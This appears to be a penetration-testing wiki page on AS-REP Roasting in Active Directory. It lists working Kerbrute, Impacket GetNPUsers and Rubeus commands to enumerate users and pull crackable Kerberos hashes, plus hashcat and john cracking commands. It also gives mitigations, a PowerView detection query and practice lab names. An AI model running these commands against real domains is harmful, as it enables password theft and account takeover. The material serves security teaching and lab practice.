# AS-REP Roasting

## Description

AS-REP Roasting takes advantage of Active Directory user accounts that have the option `Do not require Kerberos preauthentication` enabled.

![](<../../.gitbook/assets/image (2006).png>)

When this option is enabled we are able to request data from the Active Directory account that is encrypted with the users password. We can take this hash and if successful with cracking, we are able to derive the user accounts password.

## Exploitation

### Kerbrute

[https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

```bash
./kerbrute userenum <Wordlist> --dc <IP> --domain <Domain>
kerbrute userenum names.txt --dc 10.10.10.10 --domain security.local
```

![](<../../.gitbook/assets/image (2007).png>)

### Impacket

[https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

```bash
# No domain credential. Bruteforce names with Wordlist
python2 GetNPUsers.py  <Domain/> -dc-ip <IP> -usersfile <Wordlist> -format <john | hashcat> | grep -v 'Kerberos SessionError:'
python2 GetNPUsers.py  security/ -dc-ip 10.10.10.10 -usersfile names.txt -format john | grep -v 'Kerberos SessionError:'

# Valid domain credentials. Extract from all domain accounts
python2 GetNPUsers.py <Domain>/<User>:<Password> -request -format <john | hashcat> | grep "$krb5asrep$"
python2 GetNPUsers.py  security.local/bart:'StrongPassword!!' -request -dc-ip 10.10.10.10 -format john | grep "$krb5asrep$"
```

### Rubeus

[https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

```bash
# Extract from all domain accounts
.\Rubeus.exe asreproast
.\Rubeus.exe asreproast /format:hashcat /outfile:C:Hashes.txt
```

## Cracking

```bash
# Windows
hashcat64.exe -m 18200 c:Hashes.txt rockyou.txt

# Linux
john --wordlist rockyou.txt Hashes.txt
hashcat -m 18200 -a 3 Hashes.txt rockyou.txt
```

![](<../../.gitbook/assets/image (2010).png>)

## Mitigation

* Ensure where possible Domain accounts do not have the`Do not require Kerberos preauthentication` option in Active Directory enabled.
* If the option is necessary, ensure accounts have exceptionally long passwords.

[Powerview](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) can be used to identify which accounts have the option enabled on the domain.

{% tabs %}
{% tab title="Powerview" %}
```bash
Get-DomainUser -PreauthNotRequired
```
{% endtab %}
{% endtabs %}

## Labs

{% tabs %}
{% tab title="Spoiler!" %}
```bash
Click the 'Show' tab to reveal online providers that use this attack vector
```
{% endtab %}

{% tab title="Show" %}
```bash
<TryHackme> # https://tryhackme.com/
VulnNet:Roasted

<HackTheBox> # https://www.hackthebox.eu/
Forest
Sauna

<CyberSecLabs> # https://www.cyberseclabs.co.uk/
Brute
```
{% endtab %}
{% endtabs %}

## References:

* [**https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a**](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
* [**https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/**](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)

***
